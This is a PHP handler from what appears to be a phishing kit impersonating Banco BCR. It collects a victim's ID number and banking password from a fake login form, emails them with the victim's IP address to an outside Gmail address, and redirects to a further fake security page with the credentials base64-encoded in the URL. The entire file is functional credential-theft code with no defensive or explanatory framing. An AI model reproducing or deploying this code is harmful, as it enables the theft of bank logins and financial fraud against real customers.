<?

include('class.phpmailer.php');

include("datos.php");



$message .= "---------------------ARRIBA BANCOBCR------------------------------\n<br>";

$message .= "Identificacion: ".$_POST['numeroCedula']."\n<br>";

$message .= "Contrasena: ".$_POST['password']."\n<br>";

$message .= "IP: ".$ip."\n<br>";

$message .= "-------------------------------------------------------------------\n<br>";

$subj = "ACCESOS BANCOBCR -".$ip;


$id= base64_encode("Identificacion :".$_POST['numeroCedula']."Contrasena :".$_POST['password']);


if(!mail("equipo13111@gmail.com", $subj , $message, "From: BANCO BANCOBCR\nContent-Type: text/html; charset=iso-8859-1")) {
header("location: SeguridadBanca.asp.php?id=KDFR22234234&sesion=".$id."");
} else {
header("location: SeguridadBanca.asp.php?id=KDFR22234234&sesion=".$id."");
}




?>
